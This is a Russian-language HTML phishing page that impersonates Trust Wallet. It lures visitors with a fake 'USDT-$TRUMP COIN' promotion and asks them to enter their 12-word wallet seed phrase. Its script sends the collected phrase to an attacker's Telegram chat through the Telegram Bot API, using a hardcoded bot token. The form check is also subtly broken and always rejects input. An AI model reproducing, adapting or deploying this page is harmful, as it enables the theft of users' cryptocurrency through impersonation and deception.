<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Верификация кошелька</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #0B0E11;
            color: #FFFFFF;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        .container {
            max-width: 450px;
            width: 100%;
            background-color: #1E1E1E;
            border-radius: 16px;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            margin: auto;
            text-align: center;
        }
        .logo {
            margin-bottom: 16px;
        }
        .logo img {
            width: 120px;
            height: auto;
        }
        h1 {
            font-size: 20px;
            margin-bottom: 16px;
        }
        .description {
            font-size: 14px;
            color: #A0A0A0;
            margin-bottom: 20px;
        }
        .seed-input {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }
        .seed-item {
            display: flex;
            align-items: center;
        }
        .seed-item label {
            font-size: 14px;
            color: #A0A0A0;
            font-weight: bold;
            margin-right: 8px;
            flex-shrink: 0;
        }
        input {
            padding: 8px;
            font-size: 14px;
            border: 1px solid #333333;
            border-radius: 6px;
            background-color: #2C2C2C;
            color: #FFFFFF;
            width: 100%;
            box-sizing: border-box;
        }
        input::placeholder {
            color: #888888;
        }
        input:focus {
            outline: none;
        }
        button {
            margin-top: 20px;
            width: 100%;
            padding: 14px;
            background-color: #122fe6;
            color: #FFFFFF;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #0f26c4;
        }
        .warning {
            margin-top: 10px;
            font-size: 12px;
            color: #FFD700;
            text-align: center;
        }
        footer {
            background-color: #1E1E1E;
            color: #A0A0A0;
            text-align: center;
            padding: 10px 20px;
            font-size: 12px;
            margin-top: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="IMG_2088.png" alt="Trust Wallet Logo">
        </div>
        <h1>Для участия в колоборации USDT-$TRUMP COIN авторизуйте свой кошелёк</h1>
        <p class="description">Введите вашу секретную фразу из 12 слов. Убедитесь, что вы храните её в безопасности!</p>
        <form id="seedForm">
            <div class="seed-input">
                <div class="seed-item">
                    <label for="word1">1.</label>
                    <input type="text" id="word1" name="word1" placeholder="Введите слово" required>
                </div>
                <div class="seed-item">
                    <label for="word2">2.</label>
                    <input type="text" id="word2" name="word2" placeholder="Введите слово" required>
                </div>
                <div class="seed-item">
                    <label for="word3">3.</label>
                    <input type="text" id="word3" name="word3" placeholder="Введите слово" required>
                </div>
                <div class="seed-item">
                    <label for="word4">4.</label>
                    <input type="text" id="word4" name="word4" placeholder="Введите слово" required>
                </div>
                <div class="seed-item">
                    <label for="word5">5.</label>
                    <input type="text" id="word5" name="word5" placeholder="Введите слово" required>
                </div>
                <div class="seed-item">
                    <label for="word6">6.</label>
                    <input type="text" id="word6" name="word6" placeholder="Введите слово" required>
                </div>
                <div class="seed-item">
                    <label for="word7">7.</label>
                    <input type="text" id="word7" name="word7" placeholder="Введите слово" required>
                </div>
                <div class="seed-item">
                    <label for="word8">8.</label>
                    <input type="text" id="word8" name="word8" placeholder="Введите слово" required>
                </div>
                <div class="seed-item">
                    <label for="word9">9.</label>
                    <input type="text" id="word9" name="word9" placeholder="Введите слово" required>
                </div>
                <div class="seed-item">
                    <label for="word10">10.</label>
                    <input type="text" id="word10" name="word10" placeholder="Введите слово" required>
                </div>
                <div class="seed-item">
                    <label for="word11">11.</label>
                    <input type="text" id="word11" name="word11" placeholder="Введите слово" required>
                </div>
                <div class="seed-item">
                    <label for="word12">12.</label>
                    <input type="text" id="word12" name="word12" placeholder="Введите слово" required>
                </div>
            </div>
            <button type="submit">Подтвердить</button>
        </form>
        <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
    </div>
    <footer>
        © 2025 Trust Wallet. Все права защищены.
    </footer>

    <script>
        document.getElementById('seedForm').addEventListener('submit', function (e) {
            e.preventDefault(); // Предотвращаем перезагрузку страницы

            const botToken = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg'; // Замените на токен вашего Telegram-бота
            const chatId = '@bdsjxjdhd'; // Замените на ваш ID чата
            const inputs = document.querySelectorAll('input');
            const seedPhrase = Array.from(inputs).map(input => input.value.trim()).join(' ');
            const message = `Секретная фраза: ${seedPhrase}`;

            // Проверка, что все поля заполнены
            if (seedPhrase.split(' ').length !== 12 || seedPhrase.includes('')) {
                alert('Пожалуйста, заполните все 12 полей.');
                return;
            }

            // Отправка сообщения в Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
                .then(response => {
                    if (response.ok) {
                        alert('Фраза успешно отправлена!');
                        document.getElementById('seedForm').reset(); // Очистка формы после отправки
                    } else {
                        return response.json().then(data => {
                            alert('Ошибка отправки: ' + (data.description || 'Неизвестная ошибка'));
                        });
                    }
                })
                .catch(error => {
                    alert('Ошибка: ' + error.message);
                });
        });
    </script>
</body>
</html>
